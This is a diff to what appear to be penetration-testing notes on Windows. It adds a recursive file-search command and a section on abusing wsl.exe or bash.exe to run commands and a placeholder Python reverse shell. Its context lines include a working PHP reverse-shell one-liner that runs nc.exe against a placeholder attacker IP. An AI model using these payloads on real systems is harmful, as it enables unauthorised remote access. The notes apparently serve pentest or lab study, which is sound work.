@@ -40,7 +40,8 @@ certutil - command like wget.
 ---
 cd /users/administrator - command to get to administrator directory.
 ---
-
+where /R (recursive) c:\windows - command that we can use to find a file on disk c in the windows directory.
+---
 ```
 ## Reverse shell using FTP/SMB and meterpreter
 ```
@@ -157,4 +158,14 @@ First we need to locate out nc.exe and upload it to the FTP/SMB server.
 After we uploaded the nc.exe we need to create our reverse_shell.php file, we can use the next command:
 ---<?php system('nc.exe -e cmd.exe x.x.x.x $PORT')?>---
 After we've uploaded the file we can execute it and get a reverse shell.
+```
+# Windows Subsystem for Linux (WSL)
+```
+First we need to look for a file named bash.exe/ wsl.exe.
+We can use the command ---> where /R (recursive) c:\windows (any directory we think it my be in) bash.exe/ wsl.exe.
+Now we need to execute the file that we've found.
+Another way we can abuse the wsl.exe/ bash.exe files is using commands with them for example:
+1. wsl whoami
+2. wsl python -c 'Python_Reverse_Shell'
+When we've executed the file we will get a windows shell
 ```
